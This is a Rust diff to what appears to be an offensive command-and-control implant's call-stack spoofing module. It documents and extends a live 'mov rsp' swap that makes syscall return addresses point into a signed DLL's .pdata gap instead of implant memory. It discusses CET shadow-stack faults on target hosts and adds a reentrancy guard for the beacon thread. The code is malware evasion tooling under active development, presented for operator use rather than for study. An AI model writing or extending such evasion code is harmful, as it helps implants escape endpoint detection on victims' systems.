@@ -69,11 +69,16 @@ use nyx_implant_evasionsdk::GapPool;
 /// well before it reaches implant-allocated memory.
 const BRIDGE_DEPTH: usize = 8;
 
-/// Master switch for the RSP swap. **Defaults OFF** — the frame-chain
-/// synthesis + fake-stack staging always runs (so it's verifiable), but the
-/// actual `mov rsp` only executes when an operator has flipped this on AND the
-/// CET-aware swap seam is in place (see module docs, layer 2). This keeps the
-/// beacon loop crash-safe until the swap is live-debugged.
+/// Master switch for the RSP swap. When armed (true), the BYOUD-Gap leaf-bridge
+/// chain is staged at init and the swap executes on every syscall, making the
+/// caller's return address resolve to a signed-DLL .pdata gap instead of an
+/// implant address. **Defaults OFF** — must be explicitly armed after target-side
+/// live debugging confirms CET-off status and gap usability. On CET-on hosts
+/// (Intel TGL+, Win11 24H2+, BIOS CET enabled) the swap would fault with
+/// `#CP` (Control Protection Fault) because the fake stack's return addresses
+/// were never pushed onto the shadow stack. The CET-aware seam (should_execute
+/// gate) provides runtime degradation, but this default ensures no swap fires
+/// until the operator validates the target.
 static SPOOF_SWAP_ENABLED: AtomicBool = AtomicBool::new(false);
 
 /// Enable/disable the RSP swap at runtime. Call from a selftest or operator
@@ -295,7 +300,7 @@ fn cet_active() -> bool {
 
 /// Diagnostic flag: set true when the RSP-swap data path (chain staging) ran.
 /// A selftest reads this to confirm the swap mechanics executed without panic,
-/// even though the live `mov rsp` asm awaits the naked-function refactor.
+/// even though the live `mov rsp` asm is now real and gated behind CET checks.
 static SWAP_ATTEMPTED: AtomicBool = AtomicBool::new(false);
 
 /// Read whether the RSP-swap data path was attempted (for selftest diagnostics).
@@ -349,6 +354,12 @@ unsafe fn do_rsp_swap<T, F: FnOnce() -> T>(chain: &StagedChain, f: F) -> T {
 
     // Mark that the swap was attempted (diagnostic: a selftest can read this).
     SWAP_ATTEMPTED.store(true, Ordering::Release);
+
+    // Reentrancy guard: if another swap is in flight (shouldn't happen under
+    // the single-beacon-thread invariant, but belt-and-suspenders), degrade.
+    if SWAP_IN_FLIGHT.compare_exchange(false, true, Ordering::AcqRel, Ordering::Acquire).is_err() {
+        return f();
+    }
 
     // ---- THE mov rsp EXECUTION (Task F) -------------------------------------
     //
@@ -421,6 +432,7 @@ unsafe fn do_rsp_swap<T, F: FnOnce() -> T>(chain: &StagedChain, f: F) -> T {
     SWAP_FN.store(0, Ordering::Release);
     SWAP_F.store(0, Ordering::Release);
     SWAP_OUT.store(0, Ordering::Release);
+    SWAP_IN_FLIGHT.store(false, Ordering::Release); // release the reentrancy guard
     core::mem::forget(f); // f was consumed by the trampoline; don't double-drop.
 
     // f's result is in `out`. Assume it (the trampoline wrote it exactly once).
@@ -428,6 +440,9 @@ unsafe fn do_rsp_swap<T, F: FnOnce() -> T>(chain: &StagedChain, f: F) -> T {
 }
 
 // ---- per-call statics for the spoofed-stack trampoline (single beacon thread) ----
+/// Reentrancy guard: prevents concurrent use of the per-call statics. A CAS
+/// from 0→1 at entry and store(0) at exit. ~1 ns per call.
+static SWAP_IN_FLIGHT: AtomicBool = AtomicBool::new(false);
 static SWAP_FN: AtomicUsize = AtomicUsize::new(0); // erased run_f_on_spoof::<T> ptr
 static SWAP_F: AtomicUsize = AtomicUsize::new(0);  // &f as *const ()
 static SWAP_OUT: AtomicUsize = AtomicUsize::new(0); // *mut T out-slot
